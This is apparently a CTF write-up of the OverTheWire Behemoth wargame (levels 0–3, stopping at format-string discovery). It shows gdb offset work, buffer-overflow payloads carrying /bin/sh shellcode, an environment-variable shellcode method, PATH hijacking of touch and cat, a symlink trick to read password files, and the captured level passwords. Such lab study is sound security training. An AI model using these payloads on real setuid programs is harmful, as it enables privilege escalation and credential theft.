---
layout: post
title:  Behemoth Writeup
description: Behemoth is the sequel to Narnia and is rated to be slightly harder. In comparison to Narnia, it involved more reverse engineering exercises and required more knowledge of C. Each binary contained a different vulnerability ranging from PATH environment variable privilege escalation to buffer overflows, format string exploits, and bypassing shellcode filtering.
date:   2021-04-20
image:  '/images/behemoth.png'
tags:   [Format String, Shellcode Filter Bypass, PATH privesc, Buffer Overflow, Shellcode, Binary Exploitation]
---

**This report can be read both on this site, and as its <a href = "https://0xd4y.com/reports/Behemoth%20Writeup.pdf">original report form</a>. It is highly recommended that you read the original report form instead because it is better formatted.**

Behemoth

A look into the exploitation of vulnerable binaries

   ![](/images/0xd4y-logo-gray-centered.png)

0xd4y

April 20, 2021

0xd4y Writeups

LinkedIn: [https://www.linkedin.com/in/segev-eliezer/](https://www.google.com/url?q=https://www.linkedin.com/in/segev-eliezer/&sa=D&source=editors&ust=1653865765679122&usg=AOvVaw20yVe9TZbNRrit5cjCh7la) 

Email: [0xd4yWriteups@gmail.com](mailto:0xd4yWriteups@gmail.com)

Web: [https://0xd4y.com/](https://www.google.com/url?q=https://0xd4y.com/Writeups/&sa=D&source=editors&ust=1653865765679892&usg=AOvVaw23x5CqH5aRkEdVU5Z7lpKm) 

Table of Contents

[Executive Summary](#h.skkcx3243q92)        [3](#h.skkcx3243q92)

[Attack Narrative](#h.y7voaxif6jkg)        [4](#h.y7voaxif6jkg)

[Behemoth 0](#h.777qhcmdltsz)        [4](#h.777qhcmdltsz)

[Behemoth 1](#h.2eaegv275h63)        [5](#h.2eaegv275h63)

[Method 1](#h.vs95uriulwwh)        [8](#h.vs95uriulwwh)

[POC](#h.27qtgfoy0njb)        [9](#h.27qtgfoy0njb)

[Shellcode Execution](#h.vkme7fphqreh)        [9](#h.vkme7fphqreh)

[Method 2](#h.lu6rrk3nt1i)        [12](#h.lu6rrk3nt1i)

[Behemoth 2](#h.9e7hwp9wx39h)        [13](#h.9e7hwp9wx39h)

[Binary Analysis](#h.7p5xlkqevfbu)        [13](#h.7p5xlkqevfbu)

[Behavior](#h.x3bq9jsdb8v7)        [13](#h.x3bq9jsdb8v7)

[Ghidra](#h.oynz5ozays6k)        [13](#h.oynz5ozays6k)

[Binary Exploitation](#h.er0aqui9c1x)        [15](#h.er0aqui9c1x)

[Path Privesc (Touch)](#h.9vyv757ij9yj)        [15](#h.9vyv757ij9yj)

[Path Privesc (Cat)](#h.pshhhr55tmpg)        [15](#h.pshhhr55tmpg)

[Symbolic Link](#h.6af8invi43tw)        [16](#h.6af8invi43tw)

[Behemoth 3](#h.iwgdpudcydgl)        [17](#h.iwgdpudcydgl)

[Binary Analysis](#h.sazhas4fyil)        [17](#h.sazhas4fyil)

[Behavior](#h.cpklvm5s2jrm)        [17](#h.cpklvm5s2jrm)

[Ghidra](#h.s2k22fdd1mwn)        [18](#h.s2k22fdd1mwn)

[Discovery of Format String Vulnerability](#h.mez1g56y3rvw)        [19](#h.mez1g56y3rvw)

[Memory Addresses of Useful Functions](#h.u0pizz3c8rpk)        [19](#h.u0pizz3c8rpk)

[Overwriting Puts](#h.3jzjlah745hv)        [20](#h.3jzjlah745hv)

[Constructing Payload With GDB](#h.4zk650y4xnzm)        [20](#h.4zk650y4xnzm)

[Exploit Development](#h.jagnc9qowxus)        [21](#h.jagnc9qowxus)

[Controlling Puts Address](#h.icza0znvroe2)        [22](#h.icza0znvroe2)

[Popping a Shell](#h.z7u0fjslsnt8)        [24](#h.z7u0fjslsnt8)

[Behemoth 4](#h.eoybw49l4xbw)        [25](#h.eoybw49l4xbw)

[Binary Analysis](#h.c5nq5aylye9u)        [26](#h.c5nq5aylye9u)

[Behavior](#h.eu475ejo4tfp)        [26](#h.eu475ejo4tfp)

[Ghidra](#h.vx8y9qi7edp2)        [26](#h.vx8y9qi7edp2)

[Binary Exploitation](#h.rmftonkmrg2x)        [27](#h.rmftonkmrg2x)

[Symbolic Link Attack](#h.c06ihpx7yw4e)        [27](#h.c06ihpx7yw4e)

[Behemoth 5](#h.7apgrhmap56f)        [28](#h.7apgrhmap56f)

[Binary Analysis](#h.snnuhjwulxzn)        [28](#h.snnuhjwulxzn)

[Ghidra](#h.yodf5dnlygui)        [28](#h.yodf5dnlygui)

[Catching Behemoth6 Password Through UDP](#h.ucvx5cuzou25)        [31](#h.ucvx5cuzou25)

[Behemoth 6](#h.1iiwc3vpzmaj)        [31](#h.1iiwc3vpzmaj)

[Ghidra](#h.tihwa7xhbihg)        [32](#h.tihwa7xhbihg)

[Abusing popen()](#h.fngzaxqi0ncb)        [33](#h.fngzaxqi0ncb)

[Behemoth 7](#h.tqwpdz749mlq)        [34](#h.tqwpdz749mlq)

[Binary Analysis](#h.xjoju0hpie6u)        [34](#h.xjoju0hpie6u)

[Behavior](#h.lza0jils5m5d)        [34](#h.lza0jils5m5d)

[Ghidra](#h.88k4lr9djkg2)        [35](#h.88k4lr9djkg2)

[Constructing Payload](#h.ltv1zu8li5yq)        [37](#h.ltv1zu8li5yq)

[Calculating EIP Offset](#h.brbnafv8klgo)        [37](#h.brbnafv8klgo)

[Shellcode Address](#h.vmauwlddokdj)        [38](#h.vmauwlddokdj)

[Final Payload](#h.gb02temjdnc4)        [39](#h.gb02temjdnc4)

[Conclusion](#h.i7o2yd759joa)        [41](#h.i7o2yd759joa)

Executive Summary
=================

In contrast to [Narnia](https://www.google.com/url?q=https://0xd4y.com/Writeups/Misc/Narnia%2520Writeup.pdf&sa=D&source=editors&ust=1653865765692359&usg=AOvVaw1Xq8CpHqiNKgfYHfxwYd2z), the source code for each binary is not given.  Nevertheless, all eight binaries were successfully analyzed and exploited. Attack techniques such as shellcode injection, format string exploitation, and path privilege escalation are covered in this report. Some binaries were more of a reverse engineering exercise ([Behemoth 5](#h.7apgrhmap56f) and [Behemoth 6](#h.1iiwc3vpzmaj) for example) while others typically involved buffer overflow and format string exploits such as in [Behemoth 7](#h.tqwpdz749mlq), a challenge which showcases an interesting way of bypassing shellcode filters.

The binaries were mainly vulnerable due to a lack of boundary checks and input validation. It is critical that the SETUID bits of these binaries are removed until the remedies in the [Conclusion](#h.i7o2yd759joa) section are observed. Below is the full listing of all passwords obtained from the compromised users:

Username

Password

behemoth0

behemoth0

behemoth1

aesebootiv

behemoth2

eimahquuof

behemoth3

nieteidiel

behemoth4

ietheishei

behemoth5

aizeeshing

behemoth6

mayiroeche

behemoth7

baquoxuafo

behemoth8

pheewij7Ae

Attack Narrative
================

The credentials to the first user, behemoth0, was given as behemoth0 (the credentials are behemoth0:behemoth0). The ssh service is open on port 2221, and this ssh session provided the means for allowing the analysis of the binaries discussed in this report.

Behemoth 0
----------

Running the strings command on the binary reveals some interesting strings:

![](/reports/Behemoth/image2.png)

However, trying any of these potential passwords results in an “Access denied..” message. Using ltrace, a library call tracer, the system calls of the binary can be seen upon inputting a password:

{% highlight bash %}
┌─[✗]─[0xd4y@Writeup]─[~/business/other/overthewire/behemoth/0]  
└──╼ $ltrace ./behemoth0  
__libc_start_main(0x80485b1, 1, 0xffbafd14, 0x8048680 <unfinished ...>printf("Password: ")                                     = 10  
__isoc99_scanf(0x804874c, 0xffbafc0b, 0xf7f3e000, 0Password: 123  
)     = 1  
strlen("OK^GSYBEX^Y")                                    = 11  
strcmp("123", "eatmyshorts")                             = -1  
puts("Access denied.."Access denied..  
)                                  = 16  
+++ exited (status 0) +++
{% endhighlight %}

The binary is comparing the user input to the secret password by using the strcmp (string compare) function. Trying out the eatmyshorts password, we are given access to the next level:

![](/reports/Behemoth/image5.png)

Behemoth 1
----------

Now with a shell as the behemoth1 user, we can maintain persistence by grabbing the password from /etc/behemoth_pass directory.

Running the behemoth1 binary, the following output can be seen:

![](/reports/Behemoth/image6.png)

After downloading the binary and using ltrace, the following output is found:

{% highlight bash %}
┌─[0xd4y@Writeup]─[~/business/other/overthewire/behemoth/1]  
└──╼ $ltrace ./behemoth1  
__libc_start_main(0x804844b, 1, 0xffc01bc4, 0x8048480 <unfinished ...>printf("Password: ")                                     = 10  
gets(0xffc01ad5, 0xf7f11080, 0, 0xf7d25b7ePassword: a  
)              = 0xffc01ad5  
puts("Authentication failure.nSorry."Authentication failure.  
Sorry.  
)                  = 31  
+++ exited (status 0) +++
{% endhighlight %}

This binary is a little bit more secure in the sense that the password is not exposed by the strcmp function. Before trying to reverse engineer this binary, it is important to check for possible buffer overflow vulnerabilities. This can be done by sending a large input as follows:

{% highlight bash %}
┌─[0xd4y@Writeup]─[~/business/other/overthewire/behemoth/1]  
└──╼ $python -c "print 'A'*1000"|xclip -sel clip

behemoth1@behemoth:/behemoth$ ./behemoth1  
Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
Authentication failure.  
Sorry.  
Segmentation fault
{% endhighlight %}

The program was successfully crashed by sending a large input as can be seen from the “Segmentation fault” error. This is a strong indicator of a potential buffer overflow vulnerability.

{% highlight bash %}
┌─[0xd4y@Writeup]─[~/business/other/overthewire/behemoth/1]                                                                                                                    
└──╼ $gdb ./behemoth1  -q                                                                                                                                                      
pwndbg: loaded 196 commands. Type pwndbg [filter] for a list.                                                                                                                  
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)                                                                                                    
Reading symbols from ./behemoth1...                                                                                                                                            
(No debugging symbols found in ./behemoth1)                                                                                                                                    
pwndbg> r < <(cyclic 1000)                                                                                                                                                    
Starting program: /home/0xd4y/business/other/overthewire/behemoth/1/behemoth1 < <(cyclic 1000)                                                                                
Password: Authentication failure.                                                                                                                                              
Sorry.                                                                                                                                                                        
                                                                                                                                                                             
Program received signal SIGSEGV, Segmentation fault.                                                                                                                          
0x61617361 in ?? ()                                                                                                                                                          
{% endhighlight %}

Note how the cyclic function was used to help determine where the offset is

The output confirms the suspicion that this binary is vulnerable to a buffer overflow attack. Looking at the return address at the bottom of the result, it can be seen that the binary is looking for an address of 0x61617361. The offset can be calculated using the cyclic -l operation as follows:

{% highlight bash %}
┌─[0xd4y@Writeup]─[~/business/other/overthewire/behemoth/1]  
└──╼ $cyclic -l 0x61617361  
71
{% endhighlight %}

The offset is the amount of bytes that a binary can take before overwriting the instruction pointer (the register which points to which part of the code should be executed next). Observe from the hex addresses that this is a 32 bit binary. The file command can be used as well to verify this:

{% highlight bash %}
┌─[0xd4y@Writeup]─[~/business/other/overthewire/behemoth/1]  
└──╼ $file behemoth1  
behemoth1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=7e13226f3c05594af2cf29fe34c92cc55047eb94, not stripped
{% endhighlight %}

This binary is not stripped meaning the debug symbols[[1]](#ftnt1) of the binary can be gathered. Additionally, the binary’s security can be analyzed with the checksec command:

![](/reports/Behemoth/image13.png)

Seeing as this binary has NX (non-execute) disabed, shellcode can be written into memory and the binary will execute it (provided that the payload is formatted correctly). With the knowledge that arbitrary code can be executed and that the instruction pointer can be controlled, the binary can be exploited by using shellcode.

{% highlight bash %}
pwndbg> r < <(python -c "print 'A'*71+'B'*4")                                            
Starting program: /home/0xd4y/business/other/overthewire/behemoth/1/behemoth1 < <(python -c "print 'A'*71+'B'*4")  
Password: Authentication failure.                                                      
Sorry.                                                                                                                                                                        
                                                                                                                                                                             
Program received signal SIGSEGV, Segmentation fault.  
0x42424242 in ?? ()
{% endhighlight %}

Note how the return address was successfully controlled (42 is the hex value for B).

For the sake of learning more about binary exploitation, I will go over two different methods of pwning:                                                                                                                                                     

### Method 1

We can create a payload that has the following structure:

JUNK_BYTES + ADDRESS_TO_SHELLCODE_ + NOP_SLED + SHELLCODE

Then this payload can be inputted to the binary and it will execute the shellcode. There are many different kinds of shellcodes that can be used, however a simple /bin/sh shellcode[[2]](#ftnt2), which will return a shell upon execution. The next task is to determine where the address of the shellcode will be.

#### POC

{% highlight bash %}
pwndbg> r < <(python -c "print 'A'*71+'B'*4+'C'*23")  
pwndbg> x/100x $esp-100                                                                                                                                                        
0xffffcfdc:     0x00000000      0xf7fa6000      0xf7fa6000      0xffffd038              
0xffffcfec:     0x08048474      0x0804850c      0x41414180      0x41414141              
0xffffcffc:     0x41414141      0x41414141      0x41414141      0x41414141              
0xffffd00c:     0x41414141      0x41414141      0x41414141      0x41414141              
0xffffd01c:     0x41414141      0x41414141      0x41414141      0x41414141              
0xffffd02c:     0x41414141      0x41414141      0x41414141      0x41414141              
0xffffd03c:     0x42424242      0x43434343      0x43434343      0x43434343                                                                                                    
0xffffd04c:     0x43434343      0x43434343      0x00434343      0xf7fcb410                                                                                                  
{% endhighlight %}

Note A is 41, B is 42, and C is 43 in hex

Looking at the output of the esp register, the register responsible for pointing to the top of the stack, observe that the shellcode (in this case 43) will start at the second column of 0xffffd03c. Thus the address of the shellcode will be 0xffffd03c + 4 (each column corresponds to 4 bytes) which equals 0xffffd040.

#### Shellcode Execution

With the knowledge of how buffer overflow attacks work, we can now continue with exploiting the behemoth binary on the target system.

{% highlight bash %}
(gdb) disass main                                                                      
Dump of assembler code for function main:                                              
  0x0804844b <+0>:     push   %ebp                                                    
  0x0804844c <+1>:     mov    %esp,%ebp                                                
  0x0804844e <+3>:     sub    $0x44,%esp                                              
  0x08048451 <+6>:     push   $0x8048500                                               0x08048456 <+11>:    call   0x8048300 <printf@plt>                      
  0x0804845b <+16>:    add    $0x4,%esp                                                
  0x0804845e <+19>:    lea    -0x43(%ebp),%eax                                        
  0x08048461 <+22>:    push   %eax                                                    
  0x08048462 <+23>:    call   0x8048310 <gets@plt>                                    
  0x08048467 <+28>:    add    $0x4,%esp                                                
  0x0804846a <+31>:    push   $0x804850c                                               0x0804846f <+36>:    call   0x8048320 <puts@plt>                                    
  0x08048474 <+41>:    add    $0x4,%esp                                                
  0x08048477 <+44>:    mov    $0x0,%eax                                                
  0x0804847c <+49>:    leave                                                          
  0x0804847d <+50>:    ret                                                            
End of assembler dump.                                                                  
(gdb) b *0x08048462                                                                    
Breakpoint 1 at 0x8048462                                                              
(gdb) r < <(python -c "print 'A'*71 +'xc0xd5xffxff'+'x90'*100+'x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80'")  
Starting program: /behemoth/behemoth1 < <(python -c "print 'A'*71 +'xc0xd5xffxff'+'x90'*100+'x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe  
1xb0x0bxcdx80'")

Breakpoint 1, 0x08048462 in main ()

(gdb) s

Single stepping until exit from function main,                                        

which has no line number information.                                                

Password: Authentication failure.                                                    

Sorry.                                                                                

0xffffd5c0 in ?? ()                                                            
{% endhighlight %}

Now that the binary’s memory has been flooded, the ESP register can be checked to see which address marks the start of the shellcode:

{% highlight bash %}
(gdb) x/100x $esp-100

0xffffd55c:     0x00000000      0x00000001      0xf7fc5000      0xffffd5b8

0xffffd56c:     0x08048474      0x0804850c      0x41414154      0x41414141

0xffffd57c:     0x41414141      0x41414141      0x41414141      0x41414141

0xffffd58c:     0x41414141      0x41414141      0x41414141      0x41414141

0xffffd59c:     0x41414141      0x41414141      0x41414141      0x41414141

0xffffd5ac:     0x41414141      0x41414141      0x41414141      0x41414141

0xffffd5bc:     0xffffd5c0      0x90909090      0x90909090      0x90909090

0xffffd5cc:     0x90909090      0x90909090      0x90909090      0x90909090

0xffffd5dc:     0x90909090      0x90909090      0x90909090      0x90909090

0xffffd5ec:     0x90909090      0x90909090      0x90909090      0x90909090

0xffffd5fc:     0x90909090      0x90909090      0x90909090      0x90909090

0xffffd60c:     0x90909090      0x90909090      0x90909090      0x90909090

0xffffd61c:     0x90909090      0x90909090      0x6850c031      0x68732f2f

0xffffd62c:     0x69622f68      0x50e3896e      0xb0e18953      0x0080cd0b

0xffffd63c:     0x08048480      0x080484e0      0xf7fe9070      0xffffd64c

0xffffd64c:     0xf7ffd920      0x00000001      0xffffd7a5      0x00000000          
{% endhighlight %}

The value for the eip register can be found at 0xffffd5bc. It is then followed by a sequence of NOPs. The shellcode is most likely the one at 0xffffd61c + 8. Thus, the return address will most likely work if given a value between 0xffffd5bc + 4 and  0xffffd61c + 8.

{% highlight bash %}
behemoth1@behemoth:~$ python -c "print 'A'*71 +'xd0xd5xffxff'+'x90'*100+'x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80'"|/behemoth/behemoth1  
Password: Authentication failure.  
Sorry.  
Illegal instruction
{% endhighlight %}

It is imperative to note that upon piping this malicious payload into the binary, we did not receive a Segmentation Fault error, rather an Illegal Instruction error was printed out. This error is present whenever a program jumps to an address with code that cannot be interpreted either because it is plain data or is an ambiguous part of an opcode (that’s why this error is also called an illegal opcode error). This is an indication that our payload most likely works, however the return address needs to be tweaked so as to point to an address in memory that will correctly interpret our shellcode. After tweaking with the address for a bit by slightly decrementing it, the following is found:

{% highlight bash %}
behemoth1@behemoth:~$ python -c "print 'A'*71 +'xbbxd5xffxff'+'x90'*100+'x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80'"|/behemoth/behemoth1  
Password: Authentication failure.  
Sorry.
{% endhighlight %}

Note how now there is no error displayed

The program is most likely executing the shellcode, but a shell was not received. This is most likely due to the stdin and stdout being tied to this process. By appending ;cat - to the end of the command to output stdin, the exploit works as intended:

{% highlight bash %}
behemoth1@behemoth:~$ (python -c "print 'A'*71 +'xbbxd5xffxff'+'x90'*100+'x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80'";cat -)|/behemoth/behemoth1  
Password: Authentication failure.  
Sorry.  
whoami  
behemoth2  
cat /etc/behemoth_pass/behemoth2  
eimahquuof
{% endhighlight %}

### Method 2

Alternatively, it is possible to exploit this binary by using environment variables.

{% highlight bash %}
behemoth1@behemoth:/tmp/dfghoifdghfoidghiodfh$ export EGG=$(python -c 'print "x90x90x90x90x90x90x6ax31x58xcdx80x89xc3x89xc1x6ax46x58xcdx80x31xc0x50x6  
8x2fx2fx73x68x68x2fx62x69x6ex54x5bx50x53x89xe1x31xd2xb0x0bxcdx80"')
{% endhighlight %}

We can create a c file which will take our environment variable to use for the targeted binary.

{% highlight c %}
#include <stdio.h>  
#include <stdlib.h>  
#include <string.h>  
  
int main(int argc, char *argv[]) {       if(argc < 3) {                   printf("Usage: %s <environment variable> <target program name>n", argv[0]);                           exit(0);  
                               }           char *ptr = getenv(argv[1]); /* get env var location */               ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */                   printf("%s will be at %pn", argv[1], ptr);  
}
{% endhighlight %}

After compiling the program with gcc, the program can be executed so as to inject the shellcode into the environment variable, and find where it is located in memory:

{% highlight bash %}
behemoth1@behemoth:/tmp/dfghoifdghfoidghiodfh$ gcc -m32 find_addr.c -o find_addr

behemoth1@behemoth:/tmp/dfghoifdghfoidghiodfh$ ./find_addr EGG /behemoth/behemoth1  
EGG will be at 0xffffddd3
{% endhighlight %}

Seeing that the shellcode is at 0xffffddd3,the payload can be constructed to point to this address:

{% highlight bash %}
behemoth1@behemoth:/tmp/dfghoifdghfoidghiodfh$ (python -c "print 'A'*71+'xd3xddxffxff'";cat -)|/behemoth/behemoth1  
Password: Authentication failure.  
Sorry.  
whoami  
behemoth2
{% endhighlight %}

Behemoth 2
----------

As the behemoth2 user, the behemoth2 binary can now be executed.

### Binary Analysis

#### Behavior

After executing the binary, the program simply touches a file and then hangs:

{% highlight bash %}
behemoth2@behemoth:/behemoth$ ./behemoth2  
touch: cannot touch '30233': Permission denied
{% endhighlight %}

Seeing as this binary performs a system function, there is most likely a system function being called within the program.

#### Ghidra

After downloading the binary onto the attack box, this binary can be further analyzed within Ghidra:

{% highlight c %}
undefined4 main(void)  
  
{  
 uint uVar1; __uid_t _Var2; __uid_t _Var3; stat local_90; undefined4 local_2c; undefined local_28; char acStack38 [14]; char *local_18; __pid_t local_14; undefined *local_10;  local_10 = &stack0x00000004; local_14 = getpid(); local_18 = acStack38; sprintf((char *)&local_2c,"touch %d",local_14); uVar1 = lstat(local_18,&local_90); if ((uVar1 & 0xf000) != 0x8000) {  
   unlink(local_18);   _Var2 = geteuid();   _Var3 = geteuid();   setreuid(_Var3,_Var2);   system((char *)&local_2c); }  
 sleep(2000); local_2c = 0x20746163; local_28 = 0x20; _Var2 = geteuid(); _Var3 = geteuid(); setreuid(_Var3,_Var2); system((char *)&local_2c); return 0;  
}
{% endhighlight %}

Toward the top of the program, the sprintf function is called in which the string “touch %d” is passed into the local_2c variable (with %d corresponding to the id of this process). It is essential to note that touch is declared without using its full path (i.e. /usr/bin/touch).

Furthermore, two system calls are executed. One is within the if statement and one is outside the if statement following a sleep of 2000 seconds. This sleep call is responsible for the hanging that was experienced after executing the binary. Therefore, the first system call is to the touch command. The second system call again uses the local_2c variable, but only after it is initialized to 0x20746163. Converting 20 74 61 63 into ascii results in “ tac”.

{% highlight bash %}
behemoth2@behemoth:/behemoth$ file behemoth2  
behemoth2: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=87daf01f3941b5f8f815d758ed9e90589a9d315c, not stripped
{% endhighlight %}

Seeing as this binary is in LSB format, the “ tac” string should actually be read backwards, revealing that this is “cat “. Thus, the program first touches the a file then cats it after 2000 seconds.

### Binary Exploitation

This binary has multiple vulnerabilities, and each method of exploitation is described below:

#### Path Privesc (Touch)

Seeing as this binary executes the touch command without using its full path, a file called touch can be created which executes the /bin/bash command:

{% highlight bash %}
behemoth2@behemoth:/tmp/pathprivesc$ echo “/bin/bash” > touch  
behemoth2@behemoth:/tmp/pathprivesc$ chmod 777 touch
{% endhighlight %}

After creating this file with the aforementioned contents, the PATH environment variable can be updated to prioritize the current directory over all other directories:

{% highlight bash %}
behemoth2@behemoth:/tmp/pathprivesc$ export PATH=.:$PATH  
behemoth2@behemoth:/tmp/pathprivesc$ which touch  
./touch
{% endhighlight %}

Now, upon executing the behemoth2 binary, the touch command will be called to the newly created touch file:

{% highlight bash %}
behemoth2@behemoth:/tmp/pathprivesc$ /behemoth/behemoth2  
behemoth3@behemoth:/tmp/pathprivesc$ whoami  
behemoth3
{% endhighlight %}

#### Path Privesc (Cat)

The same methodology used for the touch command can be used for the cat command. As seen from the analysis, the cat command is also being called without using its full path:

{% highlight bash %}
behemoth2@behemoth:/tmp/pathprivesc$ echo “/bin/bash” > cat  
behemoth2@behemoth:/tmp/pathprivesc$ chmod 777 cat  
behemoth2@behemoth:/tmp/pathprivesc$ export PATH=.:$PATH  
behemoth2@behemoth:/tmp/pathprivesc$ /behemoth/behemoth2  
touch: cannot touch '29678': Permission denied  
behemoth3@behemoth:/tmp/pathprivesc$ whoami

behemoth3
{% endhighlight %}

This way of escalating privileges takes longer than the aforementioned one because a wait of 2000 seconds is necessary before cat gets executed.

#### Symbolic Link

This binary could still be abused even if the cat and touch commands were executed using their full paths. A symbolic link to the behemoth3 password file can be created so that the cat command reads the password of the behemoth3 user. The name of the file must correspond to the id of the process. When the cat command reads the contents of the created file, it will be pointed to the credentials of behemoth3, and the password of the user would be printed to stdout:

behemoth2@behemoth:/tmp/behemoth2$ /behemoth/behemoth2  
touch: cannot touch '10216': Permission denied

Once the behemoth2 binary was executed, an error occurred stating that the file 10216 was attempted to be created, but the behemoth3 user does not have the permissions to create this file under a directory owned by behemoth2. The name of the file is leaked, meaning that a symbolic link named after this file can be created before the cat command gets executed (the time limit for creating this file is 2000 seconds).

After logging into another session as the behemoth2 user, a symbolic link corresponding to 10216 can be created:

{% highlight bash %}
behemoth2@behemoth:/tmp/behemoth2$ ln -s /etc/behemoth_pass/behemoth3 10216  
behemoth2@behemoth:/tmp/behemoth2$ ls -la 10216 lrwxrwxrwx 1 behemoth2 root 28 May 15 06:53 10216 -> /etc/behemoth_pass/behemoth3
{% endhighlight %}

Note that this file is pointing to the password of the behemoth3 user.

After waiting for 2000 seconds, the password of the behemoth3 user gets printed out:

{% highlight bash %}
behemoth2@behemoth:/tmp/behemoth2$ /behemoth/behemoth2  
touch: cannot touch '10216': Permission denied  
nieteidiel
{% endhighlight %}

Behemoth 3
----------

After successfully abusing the behemoth2 binary, the next challenge is behemoth3.

### Binary Analysis

We can begin the analysis by downloading the target binary on the attack box and running the checksec command against it:

{% highlight bash %}
┌─[0xd4y@Writeup]─[~/business/other/overthewire/behemoth/3]  
└──╼ $checksec behemoth3  
[*] '/home/0xd4y/business/other/overthewire/behemoth/3/behemoth3'   Arch:     i386-32-little   RELRO:    No RELRO   Stack:    No canary found   NX:       NX disabled   PIE:      No PIE (0x8048000)   RWX:      Has RWX segments  
┌─[0xd4y@Writeup]─[~/business/other/overthewire/behemoth/3]  
└──╼ $file behemoth3behemoth3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4c39bd8f6f54ab267675a6c5e2186d65e1eb4821, not stripped
{% endhighlight %}

From the results of checksec and file, note that the binary essentially has no protection on it. Everything that could possibly hinder debug analysis on the program is disabled. Additionally, the file is not stripped, so debug symbols will be available.

#### Behavior

When executing the program, we are asked to provide an identification:
{% highlight bash %}
behemoth3@behemoth:/behemoth$ ./behemoth3  
Identify yourself: This is a test  
Welcome, This is a test  
  
aaaand goodbye again.
{% endhighlight %}



After inputting a large amount of A’s (in this example 500 A’s were used), the program prints out a minimized version of the string:

{% highlight bash %}
behemoth3@behemoth:/behemoth$ ./behemoth3  
Identify yourself: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
aaaand goodbye again.
{% endhighlight %}

Despite 500 A’s being passed into the buffer, only 200 A’s were printed out. Ghidra can be implemented to further help in understanding how this binary is working:

#### Ghidra

Ghidra translated the assembly code of the main function into the following:

{% highlight c %}
undefined4 main(void){ char local_cc [200];  printf("Identify yourself: ");  
 fgets(local_cc,200,stdin); printf("Welcome, "); printf(local_cc); puts("naaaand goodbye again."); return 0;  
}
{% endhighlight %}

A variable called local_cc of type char is declared and is allocated 200 bytes. Afterwards, the fgets function is used to allow up to 200 bytes to be passed to the local_cc variable, and therefore this binary is not vulnerable to a buffer overflow exploit. However, the user input (local_cc) is passed directly to the printf function without any sort of sanitization. Consequently, the program is likely vulnerable to a string format exploit[[3]](#ftnt3).

### Discovery of Format String Vulnerability

This can be verified by passing a format string into the local_cc variable:

{% highlight bash %}
